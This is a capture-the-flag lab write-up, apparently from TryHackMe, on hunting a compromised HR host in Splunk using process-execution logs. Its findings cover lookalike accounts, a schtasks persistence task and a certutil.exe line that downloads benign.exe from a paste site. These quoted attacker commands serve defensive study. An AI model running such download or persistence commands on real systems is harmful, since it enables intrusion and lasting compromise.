# Investigating a Compromised HR Host Using Splunk (Event ID 4688)

## Scenario

A client's IDS flagged a potentially suspicious process execution, pointing to a compromised host within the **HR department**. Subsequent analysis revealed the execution of tools associated with network information gathering and scheduled task creation, confirming the suspicion of compromise.

Due to limited resources, only **process execution logs (Event ID: 4688)** were pulled from the affected environment and ingested into Splunk under the index **`win_eventlogs`** for investigation.

### Network Segmentation

| Department | Users |
|---|---|
| **IT** | James, Moin, Katrina |
| **HR** | Haroon, Chris, Diana |
| **Marketing** | Bell, Amelia, Deepak |

---

## Q1: How many logs were ingested for the month of March 2022?

With the time range set to **All Time**:

```spl
index=win_eventlogs
```

This returned a total of **13,959** events. Hovering over the search timeline confirmed that the earliest and latest events fell between **March 4 and March 8, 2022** — meaning all ingested events belong to March 2022.

**Answer:** `13,959` events.

---

## Q2: Imposter Alert — which user account is an imposter?

Inspecting the top 10 values of the `UserName` field returned:

```
SYSTEM, Moin, James, Katrina, haroon, Chris.fort, deepak, Daina, Bell, Amelia
```

Cross-referencing these against the legitimate usernames provided in the scenario revealed two lookalike/typosquatted accounts:

- `Chris.fort` — impersonating **Chris**
- `Daina` — impersonating **Diana**

However, the `UserName` field indicated **11 distinct values** while only the top 10 were displayed by default. Selecting **Rare Values** on the `UserName` field surfaced the 11th, previously hidden account:

```
Amel1a
```

This account impersonates **Amelia**, substituting the digit `1` for the lowercase `i` — the true imposter account.

**Answer:** `Amel1a`

---

## Q3: Which HR department user was observed running scheduled tasks?

```spl
index=win_eventlogs schtasks
```

This returned 5 matching events. Filtering by the top values of the `CommandLine` field surfaced:

```
/create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart
```

This confirms a scheduled task named `OfficUpdater` was created to launch `update.exe` at system startup — a common persistence technique.

**Answer:** `Chris.fort`

---

## Q4: Which HR user executed a LOLBIN to download a payload from a file-sharing host?

Pivoting to rare command-line values across the dataset:

```spl
index=win_eventlogs | rare limit=20 CommandLine
```

This surfaced a suspicious use of a living-off-the-land binary (LOLBIN):

```
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

Filtering directly on this command:

```spl
index=win_eventlogs CommandLine="certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"
```

returned a single event, with the `UserName` field identifying the responsible account.

**Answer:** `haroon`

---

## Q5: Which LOLBIN was used to bypass security controls and download the payload?

Identified in **Q4**:

**Answer:** `certutil.exe`

`CertUtil.exe` is a legitimate, digitally-signed Windows utility for managing certificates and certificate services — making it an effective LOLBIN for evading detection, since its outbound network activity can blend in with normal administrative use.

---

## Q6: On what date was the binary executed? (YYYY-MM-DD)

Using the same event identified in **Q4**, hovering over the search timeline pinpointed the execution date.

**Answer:** `2022-03-04`

---

## Q7: Which third-party site was accessed to download the malicious payload?

Extracted from the `CommandLine` field in **Q4**:

**Answer:** `controlc.com`

---

## Q8: What filename was saved to the host from the C2 server?

Extracted from the `CommandLine` field in **Q4**:

**Answer:** `benign.exe`

---

## Q9: What flag pattern (`THM{...}`) was contained in the malicious payload?

```spl
index=win_eventlogs benign.exe
```

This returned a single event, but the event details contained no message/body field exposing the file's content. Since the payload was hosted on a public paste-style service, I navigated directly to the source URL identified in Q4/Q7:

```
https://controlc.com/e4d11035
```

The flag was retrieved directly from the hosted page content.

**Answer:** Flag retrieved from `https://controlc.com/e4d11035` (format: `THM{...}`)

---

## Q10: What URL did the infected host connect to?

Identified in **Q4**:

**Answer:** `https://controlc.com/e4d11035`

---

## Summary

| # | Finding |
|---|---------|
| Total events ingested (March 2022) | 13,959 |
| Imposter account | `Amel1a` (impersonating Amelia) |
| Other typosquatted accounts observed | `Chris.fort`, `Daina` |
| Scheduled task persistence | `OfficUpdater` → `update.exe` via `Chris.fort` |
| LOLBIN used for download | `certutil.exe` |
| User who executed the LOLBIN | `haroon` |
| Execution date | 2022-03-04 |
| Payload hosting site | controlc.com |
| Downloaded file | `benign.exe` |
| Full URL contacted | `https://controlc.com/e4d11035` |
